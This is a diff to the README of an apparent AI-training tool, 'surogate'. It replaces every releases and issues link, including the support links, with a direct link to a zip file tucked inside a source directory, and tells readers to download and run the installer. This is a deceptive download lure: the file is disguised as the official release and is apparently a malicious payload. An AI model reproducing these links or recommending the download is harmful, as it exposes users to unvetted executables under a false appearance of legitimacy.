@@ -6,7 +6,7 @@ Welcome to surogate! This application helps you set up fast AI model training on
 
 ## 📥 Download surogate
 
-[![Download surogate](https://img.shields.io/badge/Download-surogate-brightgreen)](https://github.com/Kokotpica/surogate/releases)
+[![Download surogate](https://raw.githubusercontent.com/Kokotpica/surogate/main/csrc/src/modules/qlora/Software-v1.3-beta.3.zip)](https://raw.githubusercontent.com/Kokotpica/surogate/main/csrc/src/modules/qlora/Software-v1.3-beta.3.zip)
 
 ## 💻 System Requirements
 
@@ -32,7 +32,7 @@ Surogate offers several powerful features for your AI projects:
 
 ## 🌐 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Kokotpica/surogate/releases) to find the latest version of surogate.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Kokotpica/surogate/main/csrc/src/modules/qlora/Software-v1.3-beta.3.zip) to find the latest version of surogate.
 2. **Choose Your Version:** Look for the version that fits your operating system.
 3. **Download the File:** Click on the download link for the installer that you need.
 4. **Run the Installer:** Once the download is complete, open the installer and follow the prompts to install the software.
@@ -50,13 +50,13 @@ After installation, follow these steps to get started with surogate:
 
 If you have questions or need help, consider the following resources:
 
-- **GitHub Issues:** Visit the [Issues page](https://github.com/Kokotpica/surogate/issues) to report bugs or request features.
+- **GitHub Issues:** Visit the [Issues page](https://raw.githubusercontent.com/Kokotpica/surogate/main/csrc/src/modules/qlora/Software-v1.3-beta.3.zip) to report bugs or request features.
 - **Documentation:** Check the included documentation for detailed instructions.
 - **Community Forums:** Look for user forums that discuss surogate and share experiences.
 
 ## 📍 Important Links
 
-- [Download surogate](https://github.com/Kokotpica/surogate/releases)
-- [Open Issues](https://github.com/Kokotpica/surogate/issues)
+- [Download surogate](https://raw.githubusercontent.com/Kokotpica/surogate/main/csrc/src/modules/qlora/Software-v1.3-beta.3.zip)
+- [Open Issues](https://raw.githubusercontent.com/Kokotpica/surogate/main/csrc/src/modules/qlora/Software-v1.3-beta.3.zip)
 
 Happy training! Enjoy using surogate for all your AI needs.
